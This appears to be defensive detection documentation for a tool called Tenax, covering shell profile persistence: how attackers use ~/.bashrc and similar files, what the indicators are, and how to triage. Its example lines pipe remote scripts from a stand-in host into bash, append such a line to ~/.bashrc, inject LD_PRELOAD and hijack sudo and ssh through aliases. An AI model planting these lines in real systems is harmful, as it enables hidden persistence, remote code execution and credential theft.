# Shell Profile Persistence

## Overview

Shell profile files are executed automatically when a user starts a shell session. These files are commonly used to configure environment variables, aliases, and user-specific behavior.

Because they are executed implicitly during login or shell initialization, shell profiles provide a highly effective mechanism for user-level persistence.

> **Shell profile persistence works by turning normal user behavior into an execution trigger.**

---

## Why Attackers Use Shell Profiles for Persistence

Shell profiles provide adversaries with:

- Execution tied to user activity  
- No requirement for elevated privileges  
- High likelihood of repeated execution  
- Integration into legitimate user configuration  
- Minimal visibility in system-wide monitoring  

Unlike system-level persistence, shell profiles allow attackers to remain persistent without requiring root access.

---

## Execution Semantics

Shell profile files are executed when a shell session is initialized.

Common files include:

- `~/.bashrc`
- `~/.bash_profile`
- `~/.profile`
- `~/.zshrc`
- `~/.zprofile`
- `/etc/profile`
- `/etc/bash.bashrc`

### Execution Context

- Executed under the user’s privileges  
- Triggered during:
  - Interactive login shells  
  - Non-login shells (depending on configuration)  
- May execute multiple times per session  

---

## Privilege Requirements

- User-level shell profiles can be modified by the user  
- System-wide profiles require root privileges  

This makes shell profiles ideal for:
- Post-compromise persistence  
- Lateral movement persistence  
- User-level footholds  

---

## Common Attacker Tradecraft

### 1. Inline Command Execution

Example:

```
curl http://evil.test/payload.sh | bash
```

Why this works:
- Executes every time a shell is opened  
- No persistent payload required  

---

### 2. Hidden or Subtle Execution

Example:

```
if [ -f /tmp/.cache ]; then bash /tmp/.cache; fi
```

Why attackers use this:
- Conditional execution reduces visibility  
- Payload is separated from profile  

---

### 3. Environment Variable Injection

Example:

```
export LD_PRELOAD=/tmp/libevil.so
```

Why attackers use this:
- Alters execution of other binaries  
- Enables stealthy code injection  

---

### 4. Alias or Function Hijacking

Example:

```
alias sudo='sudo /tmp/wrapper.sh'
```

or

```
function ssh() { /tmp/ssh_wrapper "$@"; }
```

Why attackers use this:
- Intercepts user commands  
- Enables credential harvesting or command manipulation  

---

### 5. Network-Based Execution Chains

Example:

```
bash -c "wget http://evil.test/a.sh -O- | sh"
```

Why attackers use this:
- Remote payload control  
- Reduced on-disk footprint  

---

## What Normal Looks Like

Legitimate shell profiles typically contain:

- Environment variable definitions  
- Aliases for convenience  
- PATH modifications  
- Prompt customization  

Example:

```
export PATH=$PATH:/usr/local/bin
alias ll='ls -la'
```

Normal profiles:
- Do not execute external network commands  
- Do not reference temporary directories  
- Do not perform complex logic  

---

## What Malicious Use Looks Like

### High-Signal Indicators

- Network execution (`curl`, `wget`)  
- Execution from:
  - `/tmp`
  - `/dev/shm`
  - `/var/tmp`
- Inline shell execution (`bash -c`, `sh -c`)  
- LD_PRELOAD or similar injection  
- Command hijacking (aliases/functions)  

### Medium-Signal Indicators

- Conditional execution blocks  
- References to unknown scripts  
- Obfuscated or encoded commands  

### Low-Signal Indicators

- PATH modifications  
- Common aliases  
- Prompt changes  

---

## ATT&CK Mapping

- **T1546.004 – Event Triggered Execution: Unix Shell Configuration Modification**

Shell profile persistence is categorized as:
- Event-triggered execution  
- User-driven persistence  

---

## Procedure Examples (Tradecraft)

Typical attacker workflow:

```
echo 'curl http://evil.test/payload.sh | bash' >> ~/.bashrc
```

Execution flow:
1. Modify shell profile  
2. Wait for user to open a shell  
3. Payload executes automatically  

---

## Analytical Guidance

### Key Question

> Does this profile execute code that should not run every time a shell starts?

---

### Focus Areas

1. Execution Behavior  
   - Does the profile execute commands or only define variables?  

2. External Interaction  
   - Does it reach out to network resources?  

3. Execution Location  
   - Are referenced scripts located in trusted directories?  

4. Command Manipulation  
   - Are core commands overridden?  

5. Persistence Logic  
   - Is execution conditional or hidden?  

---

## Triage Workflow

1. Inspect user profile files:

```
cat ~/.bashrc
cat ~/.bash_profile
cat ~/.profile
```

2. Inspect system-wide profiles:

```
cat /etc/profile
cat /etc/bash.bashrc
```

3. Identify suspicious lines  

4. Validate referenced scripts or binaries  

5. Check file metadata:

```
stat <file>
```

6. Correlate with user activity  

---

## Evidence to Preserve

- Shell profile contents  
- Referenced scripts or binaries  
- File metadata (timestamps, ownership)  
- Command history (if available)  

---

## False Positive Reduction

To reduce false positives:

- Understand user customization patterns  
- Validate expected development or admin configurations  
- Compare against known-good baselines  
- Confirm with system owner when necessary  

---

## Why Tenax Checks This Surface

Shell profiles provide:

- Reliable execution tied to user behavior  
- Low privilege requirements  
- High stealth when blended with normal configuration  

They are one of the most commonly overlooked persistence mechanisms.

> Shell profile persistence hides in plain sight — inside normal user behavior.

---

## Key Takeaway

Shell profiles transform user actions into execution triggers.

> The attacker does not need to run their code — the user does it for them.
